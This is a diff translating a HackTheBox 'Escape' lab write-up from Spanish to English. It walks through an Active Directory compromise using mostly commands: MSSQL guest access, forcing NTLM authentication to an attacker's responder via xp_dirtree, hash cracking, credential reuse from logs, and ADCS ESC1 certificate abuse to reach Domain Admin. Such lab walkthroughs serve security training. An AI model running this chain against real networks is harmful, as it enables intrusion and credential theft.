@@ -1,60 +1,58 @@
 # Escape
 
-**Plataforma:** HackTheBox · **Dificultad:** Medium · **SO:** Windows
+**Platform:** HackTheBox · **Difficulty:** Medium · **OS:** Windows
 
-Máquina de Active Directory: foothold vía MSSQL, movimiento lateral con
-credenciales en logs, y escalada a Domain Admin abusando de ADCS (ESC1).
+An Active Directory machine: foothold via MSSQL, lateral movement with
+credentials found in logs, and escalation to Domain Admin by abusing ADCS (ESC1).
 
-## Enumeración
+## Enumeration
 
 ```bash
 nmap -sC -sV -p- 10.10.11.x
 ```
 
-Puertos típicos de un DC: 53, 88 (Kerberos), 389/636 (LDAP), 445 (SMB) y
-1433 (MSSQL).
+Typical DC ports: 53, 88 (Kerberos), 389/636 (LDAP), 445 (SMB) and 1433 (MSSQL).
 
 ## Foothold
 
-Un recurso compartido SMB accesible con sesión nula contiene un PDF con
-credenciales de invitado para MSSQL. Nos conectamos:
+An SMB share accessible with a null session contains a PDF with guest
+credentials for MSSQL. We connect:
 
 ```bash
 impacket-mssqlclient PublicUser:'GuestUserCantWrite1'@10.10.11.x
 ```
 
-Forzamos autenticación NTLM hacia nuestro `responder` con `xp_dirtree`:
+We force NTLM authentication towards our `responder` with `xp_dirtree`:
 
 ```sql
 EXEC xp_dirtree '\\10.10.14.x\share', 1, 1;
 ```
 
-Capturamos el hash NetNTLMv2 de la cuenta de servicio y lo crackeamos:
+We capture the service account's NetNTLMv2 hash and crack it:
 
 ```bash
 hashcat -m 5600 sql_svc.hash rockyou.txt
 ```
 
-## Movimiento lateral
+## Lateral movement
 
-Con `sql_svc` accedemos por WinRM. En `C:\SQLServer\Logs\ERRORLOG.BAK`
-encontramos una contraseña tecleada por error en el campo de usuario, que
-pertenece a `ryan.cooper`.
+With `sql_svc` we get in over WinRM. In `C:\SQLServer\Logs\ERRORLOG.BAK` we find
+a password mistakenly typed into the username field, belonging to `ryan.cooper`.
 
 ```bash
 evil-winrm -i 10.10.11.x -u ryan.cooper -p 'Nuclear********'
 ```
 
-## Escalada: ADCS (ESC1)
+## Escalation: ADCS (ESC1)
 
-Enumeramos plantillas de certificado vulnerables con Certify:
+We enumerate vulnerable certificate templates with Certify:
 
 ```
 Certify.exe find /vulnerable
 ```
 
-La plantilla permite que el solicitante especifique el `subjectAltName`, lo que
-nos deja pedir un certificado como `Administrator`:
+The template lets the requester specify the `subjectAltName`, so we request a
+certificate as `Administrator`:
 
 ```bash
 certipy req -u ryan.cooper -p 'Nuclear********' \
@@ -62,7 +60,7 @@ certipy req -u ryan.cooper -p 'Nuclear********' \
   -upn administrator@sequel.htb
 ```
 
-Usamos el certificado para obtener el hash NT del administrador vía PKINIT:
+We use the certificate to obtain the administrator's NT hash via PKINIT:
 
 ```bash
 certipy auth -pfx administrator.pfx
@@ -75,8 +73,8 @@ evil-winrm -i 10.10.11.x -u administrator -H <hash>
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-## Aprendizajes
+## Takeaways
 
-- Las sesiones nulas en SMB siguen filtrando información sensible.
-- Los logs son un tesoro de credenciales mal ubicadas.
-- ADCS mal configurado (ESC1) es una ruta directa a Domain Admin.
+- Null SMB sessions still leak sensitive information.
+- Logs are a treasure trove of misplaced credentials.
+- A misconfigured ADCS (ESC1) is a direct path to Domain Admin.
